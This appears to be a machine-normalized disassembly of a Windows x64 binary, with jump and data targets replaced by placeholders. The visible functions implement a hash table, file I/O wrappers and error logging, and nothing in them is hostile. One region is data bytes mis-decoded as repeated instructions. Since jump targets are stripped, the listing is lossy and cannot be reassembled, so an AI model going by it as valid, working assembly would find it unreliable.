mov [ rbx + 0x10 ] rsi
mov [ rbx + 0x18 ] edi
mov [ rbx + 0x20 ] rbp
mov [ rbx + 0x30 ] 0x1
mov [ rbx + 0x28 ] 0x0
call sub_1400365a0
test rax rax
je r-xdata
lea rdx [ sub_140035230 ]
lea rcx [ sub_140035cb0 ]
call sub_140036490
mov [ rw-data ] rax
test rax rax
jne r-xdata
inc [ rw-data ]
dec eax
mov [ rw-data ] eax
jne r-xdata
mov [ rbx + 0x28 ] rax
mov rcx rbx
call sub_140034a90
jmp r-xdata
mov edx 0x1b
or r11d 0x2
lea r8 [ rw-data ]
lea ecx [ rdx - 0x11 ]
mov r9d 0x111
mov [ rw-data ] r11d
call sub_1400343a0
sub_140035fc0
push rbx
mov eax 0x30
call sub_14003d700
sub rsp rax
xor ebx ebx
call sub_140035c20
test eax eax
je r-xdata
mov eax ebx
add rsp 0x30
pop rbx
retn
lea r8 [ rw-data ]
lea edx [ rbx + 0x14 ]
lea ecx [ rbx + 0x9 ]
mov r9d 0xdc
call sub_1400343a0
test [ rw-data ] 0x1
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0x11a
lea ecx [ rdx - 0xa ]
call sub_1400343a0
call sub_140035cf0
mov edx 0x14
test rax rax
lea r8 [ rw-data ]
lea ecx [ rdx - 0xb ]
mov r9d 0xdc
setne bl
call sub_1400343a0
mov r11d [ rw-data ]
test r11b 0x1
je r-xdata
lea rcx [ rsp + 0x20 ]
call sub_140033e30
cmp [ rw-data ] ebx
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0x11a
lea ecx [ rdx - 0xa ]
call sub_1400343a0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx 0x14
lea r8 [ rw-data ]
mov r9d 0xfa
lea ecx [ rdx - 0xa ]
call sub_1400343a0
mov edx 0x1b
lea r8 [ rw-data ]
lea ecx [ rdx - 0x12 ]
mov r9d 0x100
call sub_1400343a0
mov edx 0x14
lea r8 [ rw-data ]
lea ecx [ rdx - 0xb ]
mov r9d 0x101
call sub_1400343a0
and [ rw-data ] 0xfffffffd
lea rdx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_140033eb0
lea rdx [ rsp + 0x20 ]
lea rcx [ rw-data ]
call sub_140033e90
test eax eax
je r-xdata
dec eax
mov [ rw-data ] eax
jne r-xdata
inc [ rw-data ]
mov edx 0x1b
or r11d 0x2
lea r8 [ rw-data ]
lea ecx [ rdx - 0x11 ]
mov r9d 0x111
mov [ rw-data ] r11d
call sub_1400343a0
sub_140036150
test rcx rcx
je r-xdata
retn
push rsi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov [ rsp + 0x40 ] rdi
xor edi edi
mov rsi rcx
cmp [ rcx + 0x18 ] edi
jbe r-xdata
mov rcx [ rsi ]
call sub_140034a90
mov rcx rsi
call sub_140034a90
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop rsi
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov ebp edi
nop
inc edi
add rbp 0x8
cmp edi [ rsi + 0x18 ]
jb r-xdata
nop [ rax ] eax
mov rax [ rsi ]
mov rcx [ rax + rbp ]
test rcx rcx
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
mov rbx [ rcx + 0x8 ]
call sub_140034a90
mov rcx rbx
test rbx rbx
jne r-xdata
sub_1400361e0
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x18 ] rbp
push rsi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov eax [ rcx + 0x18 ]
mov [ rsp + 0x38 ] rdi
mov rsi rdx
dec eax
mov rbp rcx
movsxd rdi eax
js r-xdata
mov rdi [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
mov [ rsp + 0x30 ] rbx
dec rdi
jns r-xdata
nop
mov rax [ rbp ]
mov rcx [ rax + rdi * 8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbx [ rcx + 0x8 ]
mov rcx [ rcx ]
call rsi
mov rcx rbx
test rbx rbx
jne r-xdata
sub_140036250
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov edi [ rcx + 0x20 ]
inc [ rcx + 0x18 ]
inc [ rcx + 0x34 ]
mov r10 [ rcx ]
lea eax [ rdi + 0x1 ]
mov rbx rcx
mov [ rcx + 0x20 ] eax
mov eax [ rcx + 0x24 ]
lea r8 [ r10 + rdi * 8 ]
add eax edi
mov r11d eax
mov [ r10 + rax * 8 ] 0x0
mov r9 [ r8 ]
mov esi [ rcx + 0x1c ]
test r9 r9
je r-xdata
mov eax [ rbx + 0x24 ]
cmp [ rbx + 0x20 ] eax
jb r-xdata
nop [ rax ] eax
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov edi [ rbx + 0x1c ]
mov rcx [ rbx ]
lea r8 [ rw-data ]
add edi edi
mov r9d 0x15b
lea edx [ rdi * 8 ]
call sub_1400349c0
mov rsi rax
test rax rax
jne r-xdata
mov r8 [ r8 ]
add r8 0x8
mov rax [ r8 ]
mov rcx [ rax + 0x8 ]
mov [ r8 ] rcx
mov rax [ r10 + r11 * 8 ]
mov [ r9 + 0x8 ] rax
mov [ r10 + r11 * 8 ] r9
jmp r-xdata
movsxd rdx [ rbx + 0x1c ]
cmp edx edi
jae r-xdata
inc [ rbx + 0x68 ]
jmp r-xdata
mov eax [ r9 + 0x10 ]
xor edx edx
div esi
cmp edx edi
je r-xdata
mov r9 [ r8 ]
test r9 r9
jne r-xdata
mov eax [ rbx + 0x1c ]
inc [ rbx + 0x38 ]
mov [ rbx ] rsi
mov [ rbx + 0x24 ] eax
mov [ rbx + 0x1c ] edi
mov r8d edi
lea rcx [ rax + rdx * 8 ]
sub r8d edx
xor edx edx
shl r8 0x3
call sub_14003d760
mov [ rbx + 0x20 ] 0x0
sub_140036350
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov edx [ rcx + 0x20 ]
mov eax [ rcx + 0x24 ]
mov rbx rcx
lea edx [ rdx + rax - 0x1 ]
mov rax [ rcx ]
mov rdi [ rax + rdx * 8 ]
mov [ rax + rdx * 8 ] 0x0
mov eax [ rcx + 0x20 ]
test eax eax
jne r-xdata
dec eax
mov [ rcx + 0x20 ] eax
mov edx [ rcx + 0x24 ]
mov rcx [ rcx ]
lea r8 [ rw-data ]
shl edx 0x3
mov r9d 0x177
call sub_1400349c0
mov r11 rax
test rax rax
jne r-xdata
cmp [ rcx + 0x8 ] 0x0
lea rax [ rcx + 0x8 ]
je r-xdata
mov [ rdx + rax * 8 ] rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
shr [ rbx + 0x24 ] 0x1
mov eax [ rbx + 0x24 ]
inc [ rbx + 0x40 ]
shr [ rbx + 0x1c ] 0x1
dec eax
mov [ rbx ] r11
mov [ rbx + 0x20 ] eax
jmp r-xdata
inc [ rbx + 0x68 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rax ]
cmp [ rcx + 0x8 ] 0x0
lea rax [ rcx + 0x8 ]
jne r-xdata
dec [ rbx + 0x18 ]
inc [ rbx + 0x3c ]
movsxd rax [ rbx + 0x20 ]
mov rdx [ rbx ]
mov rcx [ rdx + rax * 8 ]
test rcx rcx
jne r-xdata
sub_140036420
xor r8d r8d
mov r9 rcx
test rcx rcx
je r-xdata
xor eax eax
retn
movzx eax [ rcx ]
test al al
je r-xdata
mov r10d 0x100
nop [ rax + rax ] eax
movsx edx al
inc r9
or edx r10d
add r10d 0x100
mov eax edx
shr eax 0x2
xor eax edx
and eax 0xf
movzx ecx al
movzx eax [ r9 ]
imul edx edx
rol r8d cl
xor r8d edx
test al al
jne r-xdata
mov eax r8d
shr eax 0x10
xor eax r8d
retn
sub_140036490
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rdx
mov rsi rcx
lea r8d [ rax + 0x57 ]
lea rdx [ rw-data ]
lea ecx [ rax + 0x50 ]
call sub_140034910
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8d 0x79
lea rdx [ rw-data ]
lea ecx [ r8 + 0x7 ]
call sub_140034910
mov [ rbx ] rax
test rax rax
jne r-xdata
xor edx edx
mov ecx edx
nop [ rax + rax ] ax
mov rcx rbx
call sub_140034a90
mov rax [ rbx ]
add rcx 0x8
mov [ rcx + rax - 0x8 ] rdx
cmp rcx 0x80
jl r-xdata
lea rax [ sub_14003e9f0 ]
test rdi rdi
mov [ rbx + 0x18 ] 0x8
cmove rdi rax
lea rax [ sub_140036420 ]
test rsi rsi
cmove rsi rax
mov [ rbx + 0x1c ] 0x10
mov [ rbx + 0x24 ] 0x8
mov [ rbx + 0x10 ] rsi
mov rsi [ rsp + 0x38 ]
mov [ rbx + 0x8 ] rdi
mov [ rbx + 0x28 ] 0x200
mov [ rbx + 0x2c ] 0x100
mov [ rbx + 0x34 ] rdx
mov [ rbx + 0x3c ] rdx
mov [ rbx + 0x44 ] rdx
mov [ rbx + 0x4c ] rdx
mov [ rbx + 0x54 ] rdx
mov [ rbx + 0x5c ] rdx
mov [ rbx + 0x64 ] rdx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1400365a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
mov eax 0x20
call sub_14003d700
sub rsp rax
mov eax [ rcx + 0x30 ]
mov r13 rdx
xor edx edx
shl eax 0x8
xor r12d r12d
mov rbx rcx
div [ rcx + 0x18 ]
mov [ rcx + 0x68 ] r12d
cmp [ rcx + 0x28 ] eax
ja r-xdata
mov rcx r13
call [ rbx + 0x10 ]
inc [ rbx + 0x44 ]
xor edx edx
mov ebp eax
div [ rbx + 0x24 ]
cmp edx [ rbx + 0x20 ]
jae r-xdata
call sub_140036250
mov rax [ rbx ]
mov r14 [ rbx + 0x8 ]
movsxd rcx edx
mov rdi [ rax + rcx * 8 ]
lea rsi [ rax + rcx * 8 ]
test rdi rdi
je r-xdata
xor edx edx
mov eax ebp
div [ rbx + 0x1c ]
mov rax [ rsi ]
test rax rax
jne r-xdata
nop [ rax ] eax
mov r12 [ rax ]
mov [ rax ] r13
inc [ rbx + 0x50 ]
lea rdx [ rw-data ]
lea ecx [ rax + 0x18 ]
mov r8d 0xc1
call sub_140034910
test rax rax
jne r-xdata
add rdi 0x8
mov rsi rdi
mov rdi [ rdi ]
test rdi rdi
jne r-xdata
inc [ rbx + 0x48 ]
mov rcx [ rdi ]
mov rdx r13
call r14
test eax eax
je r-xdata
mov [ rax ] r13
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] ebp
mov [ rsi ] rax
inc [ rbx + 0x4c ]
inc [ rbx + 0x30 ]
jmp r-xdata
inc [ rbx + 0x68 ]
jmp r-xdata
inc [ rbx + 0x64 ]
cmp [ rdi + 0x10 ] ebp
jne r-xdata
mov rax r12
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
sub_1400366b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rcx
mov [ rcx + 0x68 ] 0x0
mov rcx rdx
mov r13 rdx
call [ rdi + 0x10 ]
inc [ rdi + 0x44 ]
xor edx edx
mov ebp eax
div [ rdi + 0x24 ]
cmp edx [ rdi + 0x20 ]
jae r-xdata
mov rax [ rdi ]
mov r12 [ rdi + 0x8 ]
movsxd rcx edx
mov rbx [ rax + rcx * 8 ]
lea rsi [ rax + rcx * 8 ]
test rbx rbx
je r-xdata
xor edx edx
mov eax ebp
div [ rdi + 0x1c ]
mov rcx [ rsi ]
test rcx rcx
jne r-xdata
inc [ rdi + 0x64 ]
cmp [ rbx + 0x10 ] ebp
jne r-xdata
mov rax [ rcx + 0x8 ]
mov [ rsi ] rax
mov rbx [ rcx ]
call sub_140034a90
dec [ rdi + 0x30 ]
mov ecx [ rdi + 0x18 ]
inc [ rdi + 0x54 ]
mov eax [ rdi + 0x30 ]
cmp ecx 0x10
jbe r-xdata
inc [ rdi + 0x58 ]
xor eax eax
jmp r-xdata
add rbx 0x8
mov rsi rbx
mov rbx [ rbx ]
test rbx rbx
jne r-xdata
inc [ rdi + 0x48 ]
mov rcx [ rbx ]
mov rdx r13
call r12
test eax eax
je r-xdata
mov rax rbx
shl eax 0x8
xor edx edx
div ecx
cmp [ rdi + 0x2c ] eax
jb r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov rcx rdi
call sub_140036350
sub_1400367a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rdi rcx
mov [ rcx + 0x68 ] 0x0
mov rcx rdx
mov r13 rdx
call [ rdi + 0x10 ]
inc [ rdi + 0x44 ]
xor edx edx
mov ebp eax
div [ rdi + 0x24 ]
cmp edx [ rdi + 0x20 ]
jae r-xdata
mov rax [ rdi ]
mov r12 [ rdi + 0x8 ]
movsxd rcx edx
mov rbx [ rax + rcx * 8 ]
lea rsi [ rax + rcx * 8 ]
test rbx rbx
je r-xdata
xor edx edx
mov eax ebp
div [ rdi + 0x1c ]
mov rax [ rsi ]
test rax rax
jne r-xdata
inc [ rdi + 0x64 ]
cmp [ rbx + 0x10 ] ebp
jne r-xdata
mov rax [ rax ]
inc [ rdi + 0x5c ]
inc [ rdi + 0x60 ]
jmp r-xdata
add rbx 0x8
mov rsi rbx
mov rbx [ rbx ]
test rbx rbx
jne r-xdata
inc [ rdi + 0x48 ]
mov rcx [ rbx ]
mov rdx r13
call r12
test eax eax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_140036880
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
mov rbx rcx
test rcx rcx
jne r-xdata
cmp [ rcx + 0x1c ] 0x0
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
mov eax 0x1
add rsp 0x20
pop rbx
retn
cmp [ rcx + 0x18 ] 0x0
je r-xdata
mov [ rbx + 0x18 ] 0x0
mov rcx [ rcx + 0x30 ]
test rcx rcx
je r-xdata
call sub_14003b6d8
mov [ rbx + 0x30 ] 0x0
mov [ rbx + 0x20 ] 0x0
sub_1400368e0
push rbx
mov eax 0x30
call sub_14003d700
sub rsp rax
cmp [ rcx + 0x18 ] 0x0
mov rax rdx
mov rbx rcx
je r-xdata
xor eax eax
add rsp 0x30
pop rbx
retn
test rdx rdx
je r-xdata
mov r9 [ rcx + 0x30 ]
movsxd r8 r8d
mov edx 0x1
mov rcx rax
mov [ rsp + 0x40 ] rdi
call sub_14003b2fc
mov rcx [ rbx + 0x30 ]
mov rdi rax
call sub_14003eac8
test eax eax
je r-xdata
mov eax edi
mov rdi [ rsp + 0x40 ]
add rsp 0x30
pop rbx
retn
call [ GetLastError@IAT ]
mov edx 0xb
lea r9 [ rw-data ]
lea ecx [ rdx - 0x9 ]
mov r8d eax
mov [ rsp + 0x20 ] 0xf5
call sub_140035900
mov edx 0x82
lea r9 [ rw-data ]
lea ecx [ rdx - 0x62 ]
lea r8d [ rdx - 0x80 ]
mov [ rsp + 0x20 ] 0xf6
call sub_140035900
mov rdi [ rsp + 0x40 ]
or eax 0xffffffff
add rsp 0x30
pop rbx
retn
sub_1400369a0
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
cmp [ rcx + 0x18 ] 0x0
movsxd rbx r8d
mov rax rdx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
test rdx rdx
je r-xdata
mov r9 [ rcx + 0x30 ]
mov rdx rbx
mov r8d 0x1
mov rcx rax
call sub_14003ec7c
test eax eax
cmovne eax ebx
add rsp 0x20
pop rbx
retn
sub_1400369f0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
mov eax 0x30
call sub_14003d700
sub rsp rax
dec edx
mov rsi rcx
mov rcx [ rcx + 0x30 ]
mov rbp r9
mov edi r8d
lea ebx [ rax - 0x2f ]
cmp edx 0x84
ja r-xdata
xor ebx ebx
lea r8 [ __dos_header ]
movsxd rax edx
movzx eax [ r8 + rax + 0x36c9c ]
mov edx [ r8 + rax * 4 + 0x36c70 ]
add rdx r8
jmp rdx
xor r8d r8d
mov edx edi
call sub_14003b5e0
mov ebx eax
jmp r-xdata
call sub_14003eaa0
mov ebx eax
jmp r-xdata
call sub_14003b4d4
mov ebx eax
jmp r-xdata
mov rcx rsi
call sub_140036880
mov edx edi
mov rcx rbp
and edx ebx
mov [ rsi + 0x30 ] rbp
mov [ rsi + 0x18 ] ebx
mov [ rsi + 0x1c ] edx
call sub_14003be60
mov ecx eax
test dil 0x10
je r-xdata
mov rcx rsi
call sub_140036880
mov edx edi
and edx ebx
mov [ rsi + 0x1c ] edx
test dil 0x8
je r-xdata
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov eax ebx
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
test r9 r9
je r-xdata
mov ebx [ rsi + 0x1c ]
jmp r-xdata
mov [ rsi + 0x1c ] edi
jmp r-xdata
call sub_14003eec0
jmp r-xdata
mov edx 0x8000
call sub_14003bf88
jmp r-xdata
mov edx 0x4000
call sub_14003bf88
jmp r-xdata
mov eax edi
and eax 0x2
je r-xdata
mov r8d 0x4
lea rcx [ rsp + 0x48 ]
test dil 0x2
je r-xdata
mov [ r9 ] rcx
jmp r-xdata
test dil 0x4
je r-xdata
test dil 0x4
je r-xdata
lea rdx [ rw-data ]
jmp r-xdata
lea rdx [ rw-data ]
jmp r-xdata
test eax eax
je r-xdata
lea rdx [ rw-data ]
jmp r-xdata
lea rdx [ rw-data ]
jmp r-xdata
call sub_140034dc0
xor eax eax
or rcx 0xffffffffffffffff
test dil 0x10
lea rdi [ rsp + 0x48 ]
jne r-xdata
mov edx 0x74
mov [ rsp + 0x20 ] 0x17b
lea r9 [ rw-data ]
lea ecx [ rdx - 0x54 ]
lea r8d [ rdx - 0xf ]
jmp r-xdata
lea rdx [ rw-data ]
mov r8d 0x4
lea rcx [ rsp + 0x48 ]
[ rdi ]
xor ecx ecx
lea rdx [ rw-data ]
nop [ rax ] eax
[ rdi ]
xor ecx ecx
lea rdx [ rw-data ]
call sub_140035900
movzx eax [ rdx + rcx ]
inc rcx
mov [ rdi + rcx - 0x2 ] al
test al al
jne r-xdata
lea rdx [ rsp + 0x48 ]
mov rcx rbp
call sub_14003efe8
test rax rax
jne r-xdata
movzx eax [ rdx + rcx ]
inc rcx
mov [ rdi + rcx - 0x2 ] al
test al al
jne r-xdata
jmp r-xdata
xor edx edx
mov rcx rsi
mov [ rsi + 0x30 ] rax
mov [ rsi + 0x18 ] ebx
call sub_140036140
jmp r-xdata
call [ GetLastError@IAT ]
lea r9 [ rw-data ]
mov edx ebx
mov ecx 0x2
mov r8d eax
mov [ rsp + 0x20 ] 0x18e
call sub_140035900
lea rdx [ rw-data ]
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x28 ] rdx
lea r9 [ rw-data ]
lea rdx [ rw-data ]
mov r8 rbp
mov ecx 0x5
mov [ rsp + 0x20 ] rax
call sub_1400356b0
mov edx 0x74
mov [ rsp + 0x20 ] 0x190
lea ecx [ rdx - 0x54 ]
lea r8d [ rdx - 0x72 ]
lea r9 [ rw-data ]
sub_140036ca8
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or al [ rdi ]
or [ rcx ] cl
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or cl [ rdx ]
or al [ rax ]
or cl [ rdx ]
or cl [ rdx ]
add cl ah
int3
sub_140036d30
mov [ rsp + 0x8 ] rbx
push rdi
mov eax 0x20
call sub_14003d700
sub rsp rax
mov eax r8d
mov rdi rdx
xor ebx ebx
mov [ rdx ] bl
mov r8 [ rcx + 0x30 ]
mov edx eax
mov rcx rdi
call sub_14003eff4
test rax rax
je r-xdata
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp [ rdi ] bl
je r-xdata
cmp ebx 0x80000000
jae r-xdata
btr ebx 0x1f
inc rdi
inc ebx
cmp [ rdi ] 0x0
jne r-xdata
sub_140036d90
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
xor ebx ebx
mov r10 rdx
mov rax rdx
cmp [ rdx ] bl
je r-xdata
btr ebx 0x1f
cmp [ rcx + 0x18 ] 0x0
je r-xdata
nop [ rax + rax ] eax
xor eax eax
add rsp 0x20
pop rbx
retn
mov r9 [ rcx + 0x30 ]
movsxd rdx ebx
mov r8d 0x1
mov rcx r10
call sub_14003ec7c
test eax eax
cmovne eax ebx
add rsp 0x20
pop rbx
retn
inc rax
inc ebx
cmp [ rax ] 0x0
jne r-xdata
cmp ebx 0x80000000
jae r-xdata
sub_140036e20
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
lea r8 [ rw-data ]
lea edx [ rax - 0x1e ]
lea ecx [ rax - 0x17 ]
mov r9d 0x10e
lea ebx [ rax - 0x1f ]
call sub_1400343a0
cmp [ rw-data ] 0x0
jne r-xdata
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x112
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
mov eax ebx
add rsp 0x20
pop rbx
retn
lea rdx [ sub_140036e10 ]
lea rcx [ sub_140036e00 ]
call sub_140036490
xor ecx ecx
test rax rax
mov [ rw-data ] rax
cmove ebx ecx
sub_140036ef0
push rsi
mov eax 0x50
call sub_14003d700
sub rsp rax
cmp [ rw-data ] 0x0
mov esi ecx
jne r-xdata
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x130
lea ecx [ rdx + 0x7 ]
mov [ rsp + 0x68 ] rdi
mov [ rsp + 0x30 ] esi
call sub_1400343a0
mov rcx [ rw-data ]
lea rdx [ rsp + 0x30 ]
call sub_1400367a0
mov rdi rax
test rax rax
jne r-xdata
call sub_140036e20
test eax eax
jne r-xdata
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x145
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
test rdi rdi
jne r-xdata
lea rdx [ rw-data ]
lea ecx [ rax + 0x18 ]
mov r8d 0x134
mov [ rsp + 0x60 ] rbx
call sub_140034910
mov rbx rax
test rax rax
je r-xdata
xor eax eax
add rsp 0x50
pop rsi
retn
mov rax rdi
mov rdi [ rsp + 0x68 ]
add rsp 0x50
pop rsi
retn
lea r9 [ rw-data ]
lea edx [ rdi + 0x69 ]
lea ecx [ rdi + 0xf ]
lea r8d [ rdi + 0x41 ]
mov [ rsp + 0x20 ] 0x147
call sub_140035900
mov rbx [ rsp + 0x60 ]
mov [ rax ] esi
mov [ rax + 0x10 ] edi
call sub_140034d20
mov [ rbx + 0x8 ] rax
test rax rax
jne r-xdata
mov rcx [ rw-data ]
mov rdx rbx
call sub_1400365a0
mov rdi rbx
mov rcx rbx
call sub_140034a90
jmp r-xdata
sub_140037000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
mov eax 0x30
call sub_14003d700
sub rsp rax
mov r13d edx
mov rbx rcx
mov r12 r8
lea rdx [ rw-data ]
lea ecx [ rax - 0x8 ]
mov r8d 0x153
mov rbp r9
or edi 0xffffffff
call sub_140034910
mov rsi rax
test rax rax
jne r-xdata
mov [ rax ] r13d
mov [ rax + 0x8 ] r12
mov [ rax + 0x10 ] rbp
mov rax [ rsp + 0x70 ]
mov edx 0x2
lea r8 [ rw-data ]
mov [ rsi + 0x20 ] rax
mov rax [ rsp + 0x78 ]
lea ecx [ rdx + 0x7 ]
mov r9d 0x15e
mov [ rsi + 0x18 ] rax
call sub_1400343a0
mov rcx [ rbx + 0x8 ]
call sub_140034cd0
cmp eax [ rbx + 0x10 ]
jg r-xdata
lea r9 [ rw-data ]
lea edx [ rdi + 0x69 ]
lea ecx [ rdi + 0x10 ]
lea r8d [ rdi + 0x42 ]
mov [ rsp + 0x20 ] 0x156
call sub_140035900
jmp r-xdata
mov edi [ rbx + 0x10 ]
mov r8 rsi
lea ecx [ rdi + 0x1 ]
mov edx edi
mov [ rbx + 0x10 ] ecx
mov rcx [ rbx + 0x8 ]
call sub_140034d00
mov rcx [ rbx + 0x8 ]
xor edx edx
call sub_140034c70
test eax eax
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov eax edi
add rsp 0x30
pop r13
pop r12
pop rdi
retn
mov edx 0x68
lea r9 [ rw-data ]
mov [ rsp + 0x20 ] 0x163
lea ecx [ rdx - 0x59 ]
lea r8d [ rdx - 0x27 ]
call sub_140035900
mov rcx rsi
call sub_140034a90
jmp r-xdata
mov rcx [ rbx + 0x8 ]
call sub_140034cd0
cmp eax [ rbx + 0x10 ]
jle r-xdata
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x16b
lea ecx [ rdx + 0x8 ]
call sub_1400343a0
sub_140037150
push rbx
mov eax 0x20
call sub_14003d700
sub rsp rax
lea r8 [ rw-data ]
lea edx [ rax - 0x1e ]
lea ecx [ rax - 0x17 ]
mov r9d 0x175
call sub_1400343a0
mov r11d [ rw-data ]
mov edx 0x2
mov ebx r11d
inc r11d
lea r8 [ rw-data ]
lea ecx [ rdx + 0x8 ]
mov r9d 0x177
mov [ rw-data ] r11d
call sub_1400343a0
mov eax ebx
add rsp 0x20
pop rbx
retn
sub_1400371b0
mov eax 0x28
call sub_14003d700
sub rsp rax
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
lea rdx [ sub_140036ec0 ]
call sub_1400361e0
mov rcx [ rw-data ]
call sub_140036150
xor r11d r11d
mov [ rw-data ] r11
mov [ rw-data ] r11
call sub_140036e20
test eax eax
je r-xdata
add rsp 0x28
retn
mov rcx [ rw-data ]
sub_140037210
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
mov eax 0x30
call sub_14003d700
sub rsp rax
mov rbx r9
mov rdi r8
mov esi edx
call sub_140036ef0
mov rcx rax
test rax rax
jne r-xdata
mov rax [ rsp + 0x68 ]
mov r9 rbx
mov r8 rdi
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0x60 ]
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_140037000
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
or eax 0xffffffff
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_140037290
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
mov eax 0x30
call sub_14003d700
sub rsp rax
cmp [ rcx ] 0x0
mov rbp r8
mov edi edx
mov rsi rcx
jne r-xdata
mov rcx [ rsi ]
mov [ rsp + 0x40 ] rbx
call sub_140034cd0
mov ebx eax
cmp eax edi
jg r-xdata
call sub_140034d20
mov [ rsi ] rax
test rax rax
jne r-xdata
mov rcx [ rsi ]
mov r8 rbp
mov edx edi
call sub_140034d00
mov eax 0x1
mov rcx [ rsi ]
xor edx edx
call sub_140034c70
test eax eax
je r-xdata
lea r9 [ rw-data ]
lea edx [ rax + 0x66 ]
lea ecx [ rax + 0xf ]
lea r8d [ rax + 0x41 ]
mov [ rsp + 0x20 ] 0x25d
call sub_140035900
xor eax eax
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov edx 0x66
lea r9 [ rw-data ]
